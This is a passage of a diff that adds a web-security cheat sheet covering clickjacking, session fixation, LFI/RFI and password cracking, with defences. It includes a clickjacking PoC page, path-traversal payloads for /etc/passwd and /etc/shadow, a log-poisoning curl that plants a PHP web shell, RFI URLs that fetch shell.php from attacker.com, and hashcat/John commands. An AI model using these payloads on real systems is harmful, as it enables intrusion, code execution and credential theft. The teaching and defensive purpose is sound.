+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Fake button visible to the victim -->
+  <div id="decoy-content">
+    <h2>Claim Your Free Prize!</h2>
+    <button style="padding:20px;font-size:20px">Click Here!</button>
+  </div>
+  
+  <!-- Actual target site overlaid transparently -->
+  <iframe id="target-frame"
+          src="https://target.com/account/delete"
+          scrolling="no">
+  </iframe>
+</body>
+</html>
+```
+
+### Clickjacking Detection
+
+Check for X-Frame-Options and Content-Security-Policy frame-ancestors header settings. If both headers are absent, the site is vulnerable to Clickjacking.
+
+```bash
+# Check X-Frame-Options header
+curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
+
+# Vulnerable response: no header, or
+X-Frame-Options: ALLOWALL
+
+# Safe response
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+### Clickjacking Defense
+
+Add X-Frame-Options and CSP frame-ancestors to response headers to defend against Clickjacking.
+
+```http
+# Add server response headers
+X-Frame-Options: DENY          # prohibit iframe from all sites
+X-Frame-Options: SAMEORIGIN    # allow iframe only from same domain
+
+# More flexible CSP approach (recommended)
+Content-Security-Policy: frame-ancestors 'none';
+Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
+```
+
+```javascript
+// Frame busting (outdated, not recommended)
+if (window.top !== window.self) {
+    window.top.location = window.self.location;
+}
+```
+
+---
+
+## 11. Session Fixation
+
+### Attack Principle
+```
+1. Attacker → obtains their own session ID
+2. Attacker → forces the victim to use that session ID
+3. Victim → logs in using that session ID
+4. Attacker → accesses victim's account using the same session ID
+```
+
+### Session Fixation Scenario
+```
+Vulnerable flow:
+1. Session issued to unauthenticated user: PHPSESSID=ATTACKER_KNOWN_ID
+2. Session delivered via URL parameter:
+   http://target.com/login?PHPSESSID=fixed_session_id
+3. Victim completes login at that URL
+4. Server does not regenerate session ID after login
+5. Attacker accesses victim's account using ATTACKER_KNOWN_ID
+```
+
+### Detection Method
+```bash
+# 1. Compare session IDs before and after login
+# Before login:
+Set-Cookie: session=BEFORE_LOGIN_ID
+
+# After login:
+Set-Cookie: session=BEFORE_LOGIN_ID  ← same session ID → vulnerable!
+# Safe: Set-Cookie: session=AFTER_LOGIN_NEW_ID ← different ID issued
+
+# 2. Test whether session via URL parameter is accepted
+GET /login?PHPSESSID=test123 HTTP/1.1
+# If test123 persists after login → Session Fixation vulnerability
+```
+
+### Session Fixation Defense
+
+In PHP, regenerate the session ID with session_regenerate_id() after successful login. Invalidating the previous session ID prevents session fixation attacks.
+
+```php
+// PHP: always regenerate session after successful login
+session_start();
+// ... login validation ...
+if (login_successful) {
+    session_regenerate_id(true);  // issue new session ID, delete old session
+    $_SESSION['user'] = $user_id;
+}
+```
+
+---
+
+## 12. LFI / RFI (File Inclusion Vulnerabilities)
+
+### LFI (Local File Inclusion)
+
+Read internal server files using LFI (Local File Inclusion) attacks. Include /etc/passwd, configuration files, and log files to steal sensitive information.
+
+```bash
+# Basic LFI
+http://target.com/?page=../../../etc/passwd
+http://target.com/?file=../../../../etc/shadow
+
+# Encoding bypass
+http://target.com/?page=..%2F..%2F..%2Fetc%2Fpasswd
+http://target.com/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+http://target.com/?page=....//....//etc/passwd   (double slash filter bypass)
+
+# Null byte bypass (PHP 5.3 and below)
+http://target.com/?page=../../../etc/passwd%00
+http://target.com/?page=../../../etc/passwd%00.jpg
+
+# Path truncation (PHP-specific)
+http://target.com/?page=../../../etc/passwd.......................
+
+# Target file list
+/etc/passwd          (user account information)
+/etc/hosts           (hosts file)
+/etc/ssh/sshd_config (SSH configuration)
+/proc/self/environ   (environment variables — PHP code injection possible)
+/var/log/apache2/access.log   (log poisoning target)
+/var/log/nginx/access.log
+/proc/self/fd/2      (stderr)
+/var/mail/www-data
+```
+
+### LFI → RCE (Log Poisoning)
+
+Use LFI to include server-side log files that contain injected PHP code, achieving Remote Code Execution.
+
+```bash
+# Step 1: Inject PHP code into the log file
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# Step 2: Execute the log file via LFI
+http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
+
+# PHP Session file injection
+# PHP session file location: /tmp/sess_[SESSION_ID]
+# Save PHP code in session, then execute via LFI
+```
+
+### RFI (Remote File Inclusion)
+
+Include malicious scripts from a remote server using RFI (Remote File Inclusion). Only works when PHP allow_url_include is enabled.
+
+```bash
+# Basic RFI (when allow_url_include=On)
+http://target.com/?page=http://attacker.com/shell.php
+http://target.com/?page=ftp://attacker.com/shell.php
+
+# Content of attacker.com/shell.php
+<?php system($_GET['cmd']); ?>
+
+# RFI via SMB (Windows)
+http://target.com/?page=\\attacker.com\share\shell.php
+
+# LFI/RFI bypass using Data URI
+http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
+
+### LFI/RFI Defense
+```php
+// PHP: allowlist approach
+$allowed_pages = ['home', 'about', 'contact'];
+$page = $_GET['page'];
+
+if (!in_array($page, $allowed_pages)) {
+    die('Invalid page');
+}
+
+include('pages/' . $page . '.php');
+
+// Prevent path traversal with realpath()
+$base = realpath('/var/www/html/pages/');
+$file = realpath($base . '/' . $page . '.php');
+
+if (strpos($file, $base) !== 0) {
+    die('Path traversal detected!');
+}
+
+// PHP configuration
+// allow_url_include = Off  (block RFI)
+// allow_url_fopen = Off    (block remote file access)
+```
+
+---
+
+## 13. Password Cracking Techniques
+
+### Offline Cracking Tools
+
+Perform offline hash cracking with Hashcat. Using GPU acceleration, billions of hashes can be computed per second.
+
+```bash
+# Hashcat — GPU-based high-speed cracking
+# MD5 cracking
+hashcat -a 0 -m 0 hashes.txt wordlist.txt
+
+# SHA-256
+hashcat -a 0 -m 1400 hashes.txt wordlist.txt
+
+# bcrypt ($2a$)
+hashcat -a 0 -m 3200 hashes.txt wordlist.txt
+
+# NTLM (Windows hashes)
+hashcat -a 0 -m 1000 ntlm_hashes.txt wordlist.txt
+
+# Rule-based (applying transformations)
+hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Brute-force (mask attack)
+hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a  (8 chars, all character types)
+hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d       (6-digit numbers)
+
+# John the Ripper
+john --wordlist=wordlist.txt hashes.txt
+john --format=md5 hashes.txt --wordlist=rockyou.txt
+john --rules --wordlist=wordlist.txt hashes.txt  # apply rules
+```
+
+### Hash Identification
+
+The hashid tool automatically identifies the algorithm type of a hash string. It can distinguish among various hash formats such as MD5, SHA-1, and bcrypt.
+
+```bash
+# Identify hash type with hashid
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+# → MD5, Domain Cached Credentials
+
+# hash-identifier
+python3 hash-identifier.py
+
+# Common hash formats
 $1$   → MD5 (Linux)
 $2a$  → bcrypt
 $5$   → SHA-256 (Linux)
